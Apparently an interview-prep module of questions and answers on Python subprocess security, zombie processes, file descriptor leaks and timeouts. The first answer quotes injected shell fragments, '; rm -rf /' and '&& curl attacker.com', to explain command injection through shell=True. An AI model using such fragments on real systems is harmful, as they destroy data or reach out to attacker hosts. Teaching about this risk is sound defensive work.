# Interview Module 02 — Linux, OS Automation & Subprocess Questions

## Q1: What is the security danger of using `shell=True` in `subprocess.run()`?
### 🗣️ Natural Senior DevOps Answer:
> *"When `shell=True` is enabled, Python passes the entire command string through the system shell (`/bin/sh -c`). If any portion of the command includes unsanitized user input (like a branch name or filename from an API webhook), an attacker can inject shell metacharacters (like `; rm -rf /` or `&& curl attacker.com`). By using `shell=False` (the default) and passing arguments as a list of strings, Python bypasses the shell interpreter completely, executing the binary with exact arguments and rendering shell injection impossible."*

---

## Q2: How do you handle zombie and orphaned processes when writing Python daemons?
### 🗣️ Natural Senior DevOps Answer:
> *"An orphaned process occurs when a parent process dies before its child; in Linux, init (PID 1) automatically adopts orphans. A zombie process occurs when a child finishes execution, but the parent has not yet read its exit status via `wait()` or `waitpid()`. In Python subprocess workers, we prevent zombies by using context managers, explicitly calling `proc.poll()` or `proc.wait()`, or registering a `SIGCHLD` signal handler to reap dead child processes."*

---

## Q3: How do you read and write Linux file descriptors without leaking them in Python?
### 🗣️ Natural Senior DevOps Answer:
> *"Every open file or network socket consumes a file descriptor allocated against the process `ulimit -n`. If files are opened without closing them, long-running daemons will eventually crash with `OSError: Too many open files`. We prevent this by strictly using Python's `with open(...) as f:` context manager, which guarantees that the descriptor is closed and flushed upon exiting the block, even if an unhandled exception is raised."*

---

## Q4: How do you capture both stdout and stderr while enforcing execution timeouts?
### 🗣️ Natural Senior DevOps Answer:
> *"We use `subprocess.run(['cmd', 'arg'], capture_output=True, text=True, timeout=10)`. The `capture_output=True` flag redirects both streams into `result.stdout` and `result.stderr`, `text=True` decodes the byte stream into readable strings, and `timeout=10` ensures that if a command hangs on an unresponsive network mount, Python raises `subprocess.TimeoutExpired` rather than blocking indefinitely."*
